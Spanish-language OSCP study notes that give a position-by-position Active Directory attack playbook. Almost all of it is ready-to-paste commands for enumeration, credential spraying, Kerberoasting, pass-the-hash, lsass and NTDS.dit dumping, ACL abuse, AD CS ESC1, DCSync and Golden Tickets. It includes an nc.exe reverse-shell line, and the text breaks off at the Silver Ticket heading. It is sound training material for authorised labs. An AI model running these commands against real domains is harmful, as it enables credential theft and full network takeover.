Active Directory de inicio a fin

Notas de estudio para la parte de AD del OSCP. No es una lista seca de comandos: cada técnica dice qué hace y por qué la usas, con el comando listo para copiar debajo. Todo está ordenado por el framework de 9 posiciones, para que cuando te quedes pegado la pregunta no sea "¿qué exploit uso?" sino "¿en qué posición estoy?".

La pregunta correcta nunca es «¿qué exploit me falta?» — es «¿en qué posición estoy y qué ataques tiene esa posición?». Si una posición no avanza, casi siempre te saltaste un ataque de su propia lista.

00Cómo usar estas notas

AD en el OSCP no es romper una máquina suelta: es una cadena. Consigues algo (un usuario, una credencial, un hash, una shell), eso te mueve a otra posición, y cada posición tiene un conjunto fijo de ataques. Avanzar es moverte de posición en posición hasta llegar al Domain Controller.

  • Identifica tu posición con el framework de abajo. Es una de nueve, más una "posición transversal" (no llegas al DC por red → monta un túnel).
  • Ataca toda la lista de esa posición en orden, sin saltarte pasos. El 90% de los atascos son un paso omitido, no una técnica exótica.
  • Cada botín te reubica. Consigues un hash → ahora estás en la Posición 4. Consigues shell → Posición 5. Vuelve a mirar el framework cada vez.
  • Toma notas y screenshots de TODO a medida que avanzas (comando + salida). La parte de AD es todo-o-nada por cadena; si llegas al DC pero no documentaste el camino, pierdes puntos.
Convención de estas notas: uso variables de shell ($IP, $DC, $DOMAIN, $USER, $PASS, $HASH) para que puedas copiar el comando y solo ajustar las variables una vez (ver Variables y setup). Las herramientas son las del toolkit estándar de Kali: nxc es NetExec (el sucesor de CrackMapExec; si tu caja aún trae crackmapexec, los flags son idénticos).

01El framework de 9 posiciones

Este es el mapa. Pincha la posición en la que estás y salta directo a sus ataques.

POSICIÓN 1
Solo IP / red
Ni usuarios ni credenciales. Objetivo: conseguir una LISTA de usuarios.
POSICIÓN 2
Lista de usuarios
Usuarios sí, contraseñas no. AS-REP roasting, spraying, user=pass.
POSICIÓN 3
1 credencial de dominio
BloodHound → Kerberoasting → shares/LDAP → ¿admin en algún host?
POSICIÓN 4
Un hash NTLM
Pass-the-Hash, overpass-the-hash, nxc para ver dónde es admin.
POSICIÓN 5
Shell de usuario
Privesc local: SeImpersonate, DPAPI, historial PS, winPEAS.
POSICIÓN 6
Admin local / SYSTEM
SAM/SYSTEM, lsass, LAPS, SeBackup+robocopy, creds cacheadas.
POSICIÓN 7
ACL sobre un objeto
Edges de BloodHound: GenericAll, WriteDacl, AddMember, Shadow Creds.
POSICIÓN 8
Servicio con contexto
MSSQL → xp_cmdshell, AD CS (ESC1-8), app web con creds.
POSICIÓN 9
Privilegio de dominio
DCSync, Golden/Silver Ticket, PtT, abuso de delegación.
Posición transversal (puede darse en cualquier punto): ¿el DC o una segunda subred no se alcanzan desde tu Kali? No es una posición nueva, es un bloqueo de red. Monta un túnel y sigues atacando desde donde estabas, pero ahora alcanzando la red interna.

02Variables y setup

Define esto una vez al empezar la máquina de AD y reutiliza las variables en todos los comandos. Ahorra errores de tipeo y hace los screenshots más limpios.

export IP=10.10.10.10          # IP del host objetivo actual
export DC=10.10.10.10          # IP del Domain Controller
export DOMAIN=corp.local       # nombre del dominio (FQDN)
export DCHOST=dc01.corp.local  # hostname del DC (para Kerberos)
export USER=jdoe
export PASS='Verano2025!'
export HASH=aad3b435b51404eeaad3b435b51404ee:NTHASH   # LM:NT, o solo :NT

Imprescindible: /etc/hosts y reloj

Kerberos trabaja con nombres, no IPs, y es estricto con el reloj. Mapea el DC en /etc/hosts y sincroniza la hora antes de tocar nada de Kerberos, o verás errores de "clock skew" / "KRB_AP_ERR_SKEW".

# añade DC y dominio a /etc/hosts
echo "$DC $DCHOST $DOMAIN dc01" | sudo tee -a /etc/hosts

# sincroniza tu reloj con el DC (clave para Kerberos)
sudo timedatectl set-ntp off
sudo ntpdate $DC            # o: sudo rdate -n $DC
# alternativa moderna: sudo nxc smb $DC --generate-hosts-file /tmp/hosts

P1Posición 1 · Solo IP, sin usuarios ni credenciales

Señal: acabas de identificar el DC (puertos 88/389/445 abiertos). No tienes ni un usuario. Objetivo único: conseguir una LISTA de nombres de usuario válidos. Casi todo lo demás en AD depende de tener esa lista.

Reconocimiento de puertos

Un DC se delata por su combinación de puertos: 88 (Kerberos), 389/636 (LDAP/LDAPS), 445 (SMB), 5985 (WinRM). Escanea completo y deja que nmap te extraiga el dominio y el hostname de los certificados y de SMB.

nmap -p- --min-rate 2000 -Pn $IP -oN nmap-full.txt
nmap -p 53,88,135,139,389,445,464,636,3268,3389,5985,9389 -sCV $IP -oN nmap-ad.txt
# nmap te revela el dominio y el FQDN del DC en la salida de LDAP/SMB/RDP

SMB sin credenciales (null session / guest)

Antes de nada prueba sesión nula y usuario guest. Si cualquiera funciona, a veces puedes listar shares y hasta enumerar usuarios del dominio sin tener una sola credencial.

nxc smb $IP                       # firma: dominio, hostname, SMBv1, signing
nxc smb $IP -u '' -p ''           # null session
nxc smb $IP -u 'guest' -p ''      # cuenta guest
nxc smb $IP -u '' -p '' --shares  # ¿shares legibles sin login?
nxc smb $IP -u 'guest' -p '' --rid-brute 10000   # enumera usuarios por RID
smbclient -L //$IP/ -N           # listar shares anónimo
smbclient //$IP/Share -N         # conectar a un share anónimo

RPC y enum4linux-ng

rpcclient por sesión nula puede volcar usuarios, grupos y la política de contraseñas (vital para saber el umbral de bloqueo antes de hacer spraying). enum4linux-ng automatiza todo esto en un solo comando.

rpcclient -U '' -N $IP
# dentro de rpcclient:
  enumdomusers        # lista usuarios + sus RIDs
  enumdomgroups
  querydominfo
  getdompwinfo        # política de contraseñas / lockout
  queryuser 0x450     # detalle de un usuario por RID
  lookupnames jdoe

# todo de una, automatizado:
enum4linux-ng -A $IP
enum4linux-ng -A -u '' -p '' $IP

LDAP anónimo

Algunos DCs permiten binds LDAP anónimos. Si es el caso, extraes el naming context, usuarios y descripciones directamente. Las description de las cuentas a veces guardan contraseñas (ver Posición 3).

# naming context base (sirve para armar el DN)
ldapsearch -x -H ldap://$IP -s base namingcontexts

# volcar usuarios (ajusta el DC= al dominio)
ldapsearch -x -H ldap://$IP -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description

# windapsearch: más cómodo para listar usuarios/equipos
windapsearch -d $DOMAIN --dc-ip $DC -U
windapsearch -d $DOMAIN --dc-ip $DC --computers

Enumeración de usuarios por Kerberos (kerbrute)

Cuando SMB/LDAP/RPC están cerrados, Kerberos (88) casi nunca lo está. kerbrute userenum pregunta al DC por cada nombre de una wordlist y te dice cuáles existen sin generar logins fallidos (no bloquea cuentas). Es la forma más fiable de construir la lista de usuarios desde cero.

kerbrute userenum -d $DOMAIN --dc $DC /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
# listas útiles de nombres:
#   /usr/share/seclists/Usernames/Names/names.txt
# genera candidatos desde nombres reales (web, PDF metadata, etc.):
#   username-anarchy -i nombres.txt   →  jdoe, john.doe, j.doe, doej...

DNS del dominio

El DC suele ser también el DNS. Un volcado de zona o consultas de registros SRV te dan hostnames internos (otros servidores, nombres de servicio) que amplían la superficie.

dig @$DC $DOMAIN any
dig axfr @$DC $DOMAIN                      # transferencia de zona (si está mal configurada)
nslookup -type=SRV _ldap._tcp.dc._msdcs.$DOMAIN $DC
¿Qué conseguí? Una lista de usuarios → vas a la Posición 2.  ·  ¿Una credencial de una web/share? → Posición 3.  ·  ¿El DC no responde desde Kali? → monta un túnel.

P2Posición 2 · Tengo lista de usuarios, ninguna contraseña

Objetivo: convertir un nombre de usuario en una credencial o un hash crackeable. Tres ataques, en este orden: AS-REP roasting (gratis, no necesita nada más), luego password spraying, y de paso prueba usuario=contraseña.

AS-REP Roasting

Las cuentas con "Do not require Kerberos preauthentication" activado te entregan un blob cifrado con su contraseña sin que tengas que autenticarte. Lo pides, lo crackeas offline con hashcat. Pruébalo siempre: es gratis y no bloquea cuentas.

# pedir AS-REP de toda tu lista de usuarios (sin contraseña)
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC -format hashcat -outputfile asrep.txt

# si ya tienes 1 credencial, pide la de TODO el dominio de golpe:
impacket-GetNPUsers $DOMAIN/$USER:$PASS -request -dc-ip $DC -format hashcat

# con nxc:
nxc ldap $DC -u users.txt -p '' --asreproast asrep.txt

# crackear (modo 18200 = AS-REP)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

Password Spraying

En vez de muchas contraseñas contra un usuario (bloquea), pruebas una contraseña plausible contra todos los usuarios. Mira primero la política de lockout (Posición 1) para no bloquear el dominio. kerbrute passwordspray es el más silencioso porque no deja logins fallidos de red.

# contraseñas plausibles: Estación+año, NombreEmpresa123!, Welcome1, Password1...
kerbrute passwordspray -d $DOMAIN --dc $DC users.txt 'Otono2025!'

# con nxc (añade --continue-on-success para ver todos los aciertos)
nxc smb $DC -u users.txt -p 'Otono2025!' --continue-on-success
nxc smb $DC -u users.txt -p passwords.txt --no-bruteforce   # empareja línea a línea

# prueba usuario=contraseña (sorprendentemente común en labs/examen)
nxc smb $DC -u users.txt -p users.txt --no-bruteforce --continue-on-success
Cuidado con el lockout. Si la política bloquea a los 5 intentos, haz spraying de una sola contraseña y espera la ventana de reset antes de la siguiente. En el examen, bloquear la cuenta de un usuario objetivo puede costarte horas.
¿Qué conseguí? Una credencial (user:pass) → Posición 3.  ·  Un hash AS-REP/Kerberos que crackeaste → también Posición 3 con esa cred.

P3Posición 3 · Tengo 1 credencial de dominio

Esta es la posición más rica. Una credencial válida abre la enumeración completa. Orden recomendado: BloodHound (el mapa) → Kerberoasting → cazar más credenciales en shares/LDAP → ver dónde eres admin. No te saltes BloodHound: te dice el camino más corto al DC.

Validar la credencial y ver dónde sirve

Antes de enumerar, confirma que la cred es válida y comprueba de un vistazo en qué hosts tiene acceso (y si en alguno es admin local — marca (Pwn3d!)).

nxc smb $DC -u $USER -p $PASS                 # [+] válida
nxc smb 10.10.10.0/24 -u $USER -p $PASS      # barre la subred; busca (Pwn3d!)
nxc winrm 10.10.10.0/24 -u $USER -p $PASS    # ¿WinRM en algún host?

BloodHound — el mapa del dominio

BloodHound recolecta usuarios, grupos, sesiones y ACLs, y dibuja el camino más corto desde donde estás hasta Domain Admin. Es lo que convierte "no sé qué hacer" en "este usuario tiene GenericAll sobre este grupo". Recolecta con bloodhound-python (desde Kali, sin tocar el objetivo) y analiza en la GUI.

# recolector remoto (no necesita shell en Windows)
bloodhound-python -d $DOMAIN -u $USER -p $PASS -ns $DC -c all --zip

# si falla por DNS: añade -dc $DCHOST y asegúrate del /etc/hosts
# alternativa con nxc (módulo bloodhound):
nxc ldap $DC -u $USER -p $PASS --bloodhound --collection all -ns $DC

# levantar la GUI (BloodHound CE)
sudo bloodhound-ce up      # o la versión legacy: neo4j console + bloodhound
Qué mirar en BloodHound: marca tu usuario como Owned, usa "Shortest paths to Domain Admins" y "Outbound Object Control". Las aristas (edges) GenericAll, GenericWrite, WriteDacl, AddMember, ForceChangePassword y AddKeyCredentialLink son tu Posición 7.

Kerberoasting

Las cuentas de servicio con un SPN registrado (típicamente SVC_*, MSSQL*) te entregan un ticket TGS cifrado con el hash de su contraseña. Lo pides con una cred válida y lo crackeas offline. Las cuentas de servicio suelen tener contraseñas débiles y fijas → muy rentable.

impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request -outputfile kerb.txt

# con nxc:
nxc ldap $DC -u $USER -p $PASS --kerberoasting kerb.txt

# crackear (modo 13100 = TGS-REP Kerberos)
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt

PowerView (enumeración desde una shell Windows)

Si ya tienes una shell en un host del dominio, PowerView enumera desde dentro sin herramientas externas. Útil para confirmar lo de BloodHound y para buscar cosas puntuales (quién es admin de qué, descripciones, delegación).

. .\PowerView.ps1
Get-NetUser | select samaccountname,description
Get-NetUser -SPN | select samaccountname,serviceprincipalname   # cuentas kerberoasteable
Get-NetGroup "Domain Admins" -MemberName
Find-LocalAdminAccess                 # ¿dónde soy admin local?
Get-NetComputer -Unconstrained        # delegación sin restricción
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll"}

Cazar más credenciales (shares, GPP, descripciones)

Con una cred puedes leer shares. Ahí viven contraseñas en scripts, archivos de config, web.config, y sobre todo el clásico GPP cpassword en SYSVOL (cifrado con una clave pública conocida → descifrable). También revisa el campo description de cada usuario.

# spider automático de todos los shares buscando patrones de credenciales
nxc smb $IP -u $USER -p $PASS -M spider_plus
nxc smb $IP -u $USER -p $PASS --shares

# GPP cpassword en SYSVOL (Groups.xml, Services.xml...)
nxc smb $DC -u $USER -p $PASS -M gpp_password
# manual: buscar y descifrar
smbclient //$DC/SYSVOL -U "$DOMAIN/$USER%$PASS"
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhUoDPk"

# contraseñas en el campo description de las cuentas
nxc ldap $DC -u $USER -p $PASS -M get-desc-users
# manual:
ldapsearch -x -H ldap://$DC -D "$USER@$DOMAIN" -w "$PASS" -b "DC=corp,DC=local" "(description=*)" sAMAccountName description
¿Qué conseguí? Cred de otra cuenta → repites P3 con ella.  ·  Un hash NTLM → Posición 4.  ·  Admin local en un host (Pwn3d!) → entra y pasa a Posición 6.  ·  Un edge en BloodHound → Posición 7.

P4Posición 4 · Tengo un hash NTLM, no la contraseña

Un hash NTLM vale casi lo mismo que la contraseña: con Kerberos/NTLM puedes autenticarte directamente. Objetivo: ver dónde ese hash es admin, entrar por Pass-the-Hash, y de paso intentar crackearlo por si se reutiliza en otro sitio.

¿Dónde es admin este hash? (barrido)

Un hash de una cuenta local (p.ej. el Administrator local sacado de SAM) puede estar reutilizado en varios equipos. Barre la subred con el hash para encontrar dónde da (Pwn3d!).

nxc smb 10.10.10.0/24 -u Administrator -H $HASH --local-auth    # cuenta LOCAL
nxc smb 10.10.10.0/24 -u $USER -H $HASH                          # cuenta de DOMINIO
nxc winrm 10.10.10.0/24 -u $USER -H $HASH

Pass-the-Hash (entrar con el hash)

Pasas el hash NTLM en vez de la contraseña. Funciona con evil-winrm, psexec, wmiexec, etc. El formato es LMHASH:NTHASH; si solo tienes el NT, antepón aad3b435b51404eeaad3b435b51404ee: o deja los dos puntos iniciales.

# WinRM (5985) — el más cómodo si tienes acceso
evil-winrm -i $IP -u $USER -H NTHASH

# SMB (445) — shell SYSTEM
impacket-psexec $DOMAIN/$USER@$IP -hashes $HASH
impacket-wmiexec $DOMAIN/$USER@$IP -hashes $HASH     # más sigiloso, sin servicio

# cuenta LOCAL (ojo: dominio = nombre del host o '.')
impacket-psexec Administrator@$IP -hashes $HASH

Overpass-the-Hash (hash NTLM → ticket Kerberos)

Conviertes el hash NTLM en un TGT de Kerberos. Útil cuando NTLM está restringido pero Kerberos no, o para encadenar con ataques que necesitan un TGT. Requiere reloj sincronizado y usar el hostname, no la IP.

impacket-getTGT $DOMAIN/$USER -hashes $HASH -dc-ip $DC
export KRB5CCNAME=$USER.ccache
impacket-psexec -k -no-pass $DOMAIN/$USER@$DCHOST    # -k usa el ticket del KRB5CCNAME
nxc smb $DCHOST -u $USER -k --use-kcache

Intentar crackearlo

Si el hash se crackea, consigues la contraseña en claro, que suele estar reutilizada en más sitios y es más versátil que el hash. Modo 1000 de hashcat para NTLM.

echo "NTHASH" > nt.hash
hashcat -m 1000 nt.hash /usr/share/wordlists/rockyou.txt
¿Qué conseguí? Shell en un host → Posición 5 (o 6 si entraste como admin/SYSTEM).  ·  La contraseña en claro → Posición 3.

P5Posición 5 · Tengo shell de USUARIO en una máquina

Objetivo: subir a admin local / SYSTEM en ESE host, y de paso cazar credenciales de dominio que vivan ahí. Orden: privilegios del token primero (SeImpersonate es el atajo más rápido), luego secretos guardados (DPAPI, historial de PowerShell), luego enumeración automática.

Lo primero: tus privilegios y el terreno

Un solo comando (whoami /priv) puede ahorrarte toda la enumeración: si tienes SeImpersonatePrivilege o SeBackupPrivilege, ya tienes el camino a SYSTEM (ver abajo y Posición 6).

whoami /priv
whoami /groups
systeminfo
ipconfig /all           # ¿otras subredes? → pivoting
netstat -ano            # servicios locales solo en 127.0.0.1

SeImpersonatePrivilege → SYSTEM (Potatoes)

Si tu cuenta (típico en cuentas de servicio, IIS, MSSQL) tiene SeImpersonatePrivilege, puedes suplantar el token de SYSTEM con un "Potato". PrintSpoofer y GodPotato son los que mejor funcionan en objetivos modernos.

.\PrintSpoofer64.exe -i -c cmd       # shell SYSTEM interactiva
.\PrintSpoofer64.exe -c "C:\tmp\nc.exe 10.10.14.1 443 -e cmd"
.\GodPotato-NET4.exe -cmd "cmd /c whoami"   # si PrintSpoofer no va

DPAPI — credenciales guardadas del usuario

Windows guarda contraseñas (Credential Manager, navegadores, WiFi, RDP) cifradas con DPAPI, usando una clave derivada de la contraseña del usuario. Con la shell del usuario puedes descifrar sus "blobs" y recuperar credenciales de dominio frescas.

# localizar los blobs y masterkeys (en el host)
dir /a:h C:\Users\$env:USERNAME\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Credentials\
dir /a:h C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Protect\

# descifrar con impacket-dpapi (tráete los archivos a Kali o usa SMB)
impacket-dpapi masterkey -file masterkeyfile -sid S-1-5-21-... -password $PASS
impacket-dpapi credential -file credfile -key 0xMASTERKEY

# o automatizado remoto con nxc:
nxc smb $IP -u $USER -p $PASS --dpapi

Historial de PowerShell

La gente escribe contraseñas en línea de comandos. El historial de PSReadline las guarda en texto plano. Es uno de los primeros sitios que revisar y uno de los más fructíferos en el examen.

type %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
# PowerShell:
Get-Content (Get-PSReadlineOption).HistorySavePath
# busca también en scripts, Unattend.xml, web.config, *.config, *.ps1, *.bat
findstr /si password *.txt *.xml *.config *.ps1 2>nul

Enumeración automática (winPEAS)

Cuando lo anterior no da el salto, winPEAS barre el sistema entero en busca de misconfiguraciones (servicios, permisos, tareas, software). Córrelo, pero lee tú la salida: las pistas en rojo/amarillo son candidatas, no verdades.

.\winPEASx64.exe
# vectores clásicos: servicio con binpath modificable, unquoted service path,
# AlwaysInstallElevated, tarea programada escribible, DLL hijacking.
# mira también PrivEsc Windows de tu cheatsheet general.
¿Qué conseguí? SYSTEM / admin local → Posición 6 (volcar secretos).  ·  Una cred de dominio nueva (DPAPI/historial) → Posición 3.

P6Posición 6 · Admin local / SYSTEM en una máquina

Objetivo: extraer todos los secretos de ese host (hashes locales, hashes de dominio cacheados, credenciales en lsass, LAPS) y reutilizarlos en otros equipos para acercarte al DC. Admin local en un host casi nunca es el final: es munición para el siguiente salto.

Volcar SAM / SYSTEM / LSA (hashes locales)

La SAM guarda los hashes NTLM de las cuentas locales (incluido el Administrator local, a menudo reutilizado en todo el dominio). Con admin local los vuelcas. La forma de examen más limpia: reg save + secretsdump en modo LOCAL.

# en el host (admin): exportar las hives
reg save HKLM\SAM C:\tmp\SAM
reg save HKLM\SYSTEM C:\tmp\SYSTEM
reg save HKLM\SECURITY C:\tmp\SECURITY

# en Kali: parsear offline
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# o remoto directo con nxc / secretsdump:
nxc smb $IP -u Administrator -H $HASH --local-auth --sam --lsa
impacket-secretsdump Administrator@$IP -hashes $HASH

Volcar lsass (credenciales en memoria)

lsass.exe guarda en memoria credenciales de las sesiones activas, a veces incluyendo contraseñas en claro y tickets Kerberos de usuarios de dominio (¡incluido un admin que se haya logueado ahí!). mimikatz es el estándar; alternativamente vuelcas lsass a archivo y lo parseas en Kali con pypykatz.

# mimikatz (en el host, como admin/SYSTEM)
.\mimikatz.exe
  privilege::debug
  sekurlsa::logonpasswords
  sekurlsa::ekeys          # claves Kerberos (para overpass-the-hash)

# alternativa: volcar y parsear offline (evita AV a veces)
# crear el dump (Task Manager > lsass > Create dump, o comsvcs.dll)
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [PID_lsass] C:\tmp\lsass.dmp full
pypykatz lsa minidump lsass.dmp

LAPS

LAPS rota la contraseña del admin local de cada equipo y la guarda en un atributo LDAP (ms-Mcs-AdmPwd). Si tu cuenta tiene permiso de lectura sobre ese atributo, lees la contraseña local en claro de otros hosts.

nxc ldap $DC -u $USER -p $PASS -M laps
# y luego usas esa contraseña como admin local del host objetivo:
nxc smb $IP -u Administrator -p 'ContraseñaLAPS' --local-auth

SeBackupPrivilege → NTDS.dit con robocopy

Si tu cuenta (o la shell) tiene SeBackupPrivilege, puedes leer cualquier archivo saltándote la ACL usando el flag de backup. En un DC esto te da el NTDS.dit (la base de datos con TODOS los hashes del dominio). robocopy /B copia en modo backup; si el archivo está bloqueado, usa una shadow copy.

# copiar un archivo protegido en modo backup
robocopy /B C:\Windows\NTDS C:\tmp NTDS.dit
# si NTDS.dit está en uso, crea una instantánea VSS primero:
diskshadow /s script.txt      # script con: set context persistent / add volume C: / create / expose
# luego copias desde la shadow con robocopy /B, más el SYSTEM hive:
reg save HKLM\SYSTEM C:\tmp\SYSTEM

# en Kali: extraer todos los hashes del dominio
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
Atajo: con SeBackupPrivilege hay utilidades SeBackupPrivilegeCmdLets.dll / SeBackupPrivilegeUtils.dll que exponen Copy-FileSeBackupPrivilege, por si robocopy /B no respeta el privilegio en tu shell.
¿Qué conseguí? Hash del Administrator local → Posición 4 (reutilízalo por la red).  ·  Cred/hash de un usuario de dominio → P3 / P4.  ·  NTDS.dit del DC → Posición 9 (ya eres dueño del dominio).

P7Posición 7 · Tengo un permiso / ACL sobre un objeto

BloodHound te muestra que tu usuario (u otro que controlas) tiene un derecho sobre un objeto: una arista (edge). Cada edge es un ataque concreto. bloodyAD ejecuta la mayoría de estos abusos desde Linux con una sola línea. Identifica el edge y aplica su receta.

Edge en BloodHoundQué puedes hacer
GenericAll / GenericWrite sobre un USUARIOShadow Credentials, o resetear su contraseña, o setear un SPN y kerberoastear "targeted"
GenericAll sobre un GRUPOAñadirte al grupo (AddMember)
ForceChangePasswordResetear la contraseña del usuario sin saber la actual
WriteDacl / WriteOwner sobre el DOMINIOAuto-concederte derechos de DCSync
AddKeyCredentialLinkShadow Credentials (certipy/pywhisker)
GenericAll sobre un EQUIPORBCD, o Shadow Credentials sobre la cuenta de máquina

Resetear contraseña (GenericAll / ForceChangePassword)

El abuso más directo: si controlas un usuario, le pones una contraseña nueva y entras como él. Ruidoso (le cambias la clave) pero infalible en un lab.

bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC set password victima 'NuevaPass123!'
# alternativas:
net rpc password "victima" "NuevaPass123!" -U "$DOMAIN"/"$USER"%"$PASS" -S $DC
impacket-changepasswd $DOMAIN/victima@$DC -newpass 'NuevaPass123!' -altuser $USER -altpass $PASS

Añadirte a un grupo (GenericAll / AddMember)

Si tienes derechos sobre un grupo potente (p.ej. un grupo anidado que lleva a Domain Admins), te añades como miembro y heredas sus permisos al instante.

bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC add groupMember "GRUPO_OBJETIVO" $USER
# alternativa:
net rpc group addmem "GRUPO_OBJETIVO" "$USER" -U "$DOMAIN"/"$USER"%"$PASS" -S $DC

Shadow Credentials (GenericWrite / AddKeyCredentialLink)

En vez de cambiar la contraseña (ruidoso), le añades al objeto una clave pública de certificado en msDS-KeyCredentialLink. Luego te autenticas vía PKINIT con tu clave privada y obtienes su TGT y su hash NT — sin tocar su contraseña. Requiere AD CS o al menos un DC con soporte PKINIT.

# certipy (lo más fiable): añade la shadow cred y te devuelve TGT + hash NT
certipy shadow auto -u $USER@$DOMAIN -p $PASS -account victima -dc-ip $DC

# pywhisker + gettgtpkinit (manual, por pasos)
pywhisker -d $DOMAIN -u $USER -p $PASS --target victima --action add

# bloodyAD también lo hace:
bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC add shadowCredentials victima

Targeted Kerberoasting (GenericAll / GenericWrite sobre usuario)

Le escribes un SPN temporal a la cuenta que controlas, la kerberoasteas para sacar su hash crackeable, y limpias el SPN. Útil cuando no quieres cambiarle la contraseña.

bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC set object victima servicePrincipalName -v "fake/svc"
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request-user victima
# luego: hashcat -m 13100 ... y borra el SPN

WriteDacl sobre el dominio → DCSync

Si controlas un objeto con WriteDacl/WriteOwner sobre el objeto del dominio, te auto-concedes los derechos de replicación (DS-Replication-Get-Changes), que son justo lo que DCSync necesita. Te vuelves capaz de replicar todos los hashes como si fueras un DC.

# concederte los derechos de DCSync
bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC add dcsync $USER
# o con dacledit (impacket):
impacket-dacledit -action write -rights DCSync -principal $USER -target-dn "DC=corp,DC=local" $DOMAIN/$USER:$PASS
# si el edge es WriteOwner: primero hazte dueño
impacket-owneredit -action write -new-owner $USER -target "Domain Admins" $DOMAIN/$USER:$PASS
# luego DCSync → Posición 9
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc-user krbtgt
¿Qué conseguí? Cred/hash de la víctima → P3/P4.  ·  Derechos de DCSync → Posición 9.  ·  Membresía en Domain Admins → Posición 9.

P8Posición 8 · Tengo acceso a un servicio con contexto

A veces el camino no pasa por una cuenta sino por un servicio: un MSSQL donde eres sysadmin, una CA de AD CS mal configurada, una app web con credenciales en su config. Cada servicio tiene su propia vía a ejecución de comandos o a un ticket.

MSSQL — xp_cmdshell e impersonation

Si te autenticas a MSSQL (con una cred de dominio o SQL), puedes: habilitar xp_cmdshell para ejecutar comandos como la cuenta de servicio; impersonar a otro login si tienes IMPERSONATE; o capturar/relay el hash NTLM del servicio forzándolo a autenticarse contra ti.

impacket-mssqlclient $DOMAIN/$USER:$PASS@$IP -windows-auth
# dentro del cliente:
  enable_xp_cmdshell
  xp_cmdshell whoami
  # ver logins que puedes impersonar:
  SELECT * FROM sys.server_permissions WHERE permission_name='IMPERSONATE';
  EXEC AS LOGIN = 'sa';           # escalar a sysadmin si se puede

# con nxc (ejecutar comandos directamente):
nxc mssql $IP -u $USER -p $PASS --local-auth -x "whoami"
nxc mssql $IP -u $USER -p $PASS -M mssql_priv    # chequea rutas de privesc

AD CS — certipy (ESC1-ESC8)

Active Directory Certificate Services (la PKI del dominio) suele tener plantillas mal configuradas que permiten pedir un certificado a nombre de otro usuario (p.ej. un Domain Admin) y usarlo para autenticarte. certipy find -vulnerable te lista qué ESC aplica; ESC1 es el más común en el examen.

# 1) encontrar plantillas vulnerables
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout

# 2) ESC1: pedir cert suplantando a un admin (plantilla con ENROLLEE_SUPPLIES_SUBJECT)
certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca 'CORP-CA' -template 'VulnTemplate' -upn administrator@$DOMAIN

# 3) autenticarte con el .pfx → obtienes TGT y hash NT del admin
certipy auth -pfx administrator.pfx -dc-ip $DC
Referencia rápida de ESCs: ESC1 (subject arbitrario) · ESC2 (Any Purpose) · ESC3 (enrollment agent) · ESC4 (control sobre la plantilla → la vuelves ESC1) · ESC6 (flag EDITF_ATTRIBUTESUBJECTALTNAME2 en la CA) · ESC8 (relay NTLM al endpoint HTTP de la CA). certipy find -vulnerable te dice cuál.

App web / servicio con credenciales

Una app interna (o su base de datos / archivos de config) casi siempre guarda credenciales que se reutilizan en el dominio. Es la vía "no-Kerberos": consigues una cred ahí y vuelves a la Posición 3.

# revisa web.config, appsettings.json, connection strings, .env, cadenas de BD
findstr /si "password connectionString" *.config *.json *.xml 2>nul
¿Qué conseguí? Shell por xp_cmdshell → Posición 5 (suele traer SeImpersonate → SYSTEM).  ·  Cert/hash de un admin de dominio → Posición 9.  ·  Cred reutilizable → Posición 3.

P9Posición 9 · Tengo privilegio de alto nivel en el dominio

Señal: eres Domain Admin, tienes derechos de replicación, o el hash de krbtgt. Prácticamente has ganado. Objetivo: volcar todos los hashes (DCSync), confirmar acceso al DC, y documentar. Golden/Silver Ticket solo si necesitas persistencia o moverte sin tocar el DC.

DCSync — volcar todos los hashes del dominio

Con derechos de replicación le pides al DC que te "replique" los secretos como si fueras otro DC. Obtienes los hashes NT de todas las cuentas, incluido krbtgt (para Golden Ticket) y el Administrator del dominio.

# solo el krbtgt y el admin (rápido, para screenshot)
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc-user krbtgt
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc-user administrator

# todo el dominio
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc
# con hash en vez de pass:
impacket-secretsdump $DOMAIN/$USER@$DC -hashes $HASH -just-dc

# con nxc:
nxc smb $DC -u $USER -p $PASS --ntds

Entrar al DC como Administrator

Con el hash del Administrator del dominio (de DCSync) entras al DC por Pass-the-Hash y recoges la flag / pruebas. Este es el momento de la foto: whoami + hostname + la flag.

evil-winrm -i $DC -u Administrator -H NTHASH
impacket-psexec $DOMAIN/Administrator@$DC -hashes $HASH
type C:\Users\Administrator\Desktop\proof.txt

Golden Ticket (persistencia con krbtgt)

Con el hash de krbtgt forjas un TGT para cualquier usuario (incluso inexistente) con pertenencia a Domain Admins. Sobrevive a cambios de contraseña de otras cuentas. En el examen úsalo solo si lo pide el objetivo o necesitas re-acceso; para la prueba normal, DCSync + PtH basta.

# necesitas: hash NT de krbtgt + el SID del dominio
impacket-ticketer -nthash KRBTGT_NTHASH -domain-sid S-1-5-21-... -domain $DOMAIN administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass $DOMAIN/administrator@$DCHOST

Silver Ticket (TGS forjado para un servicio)

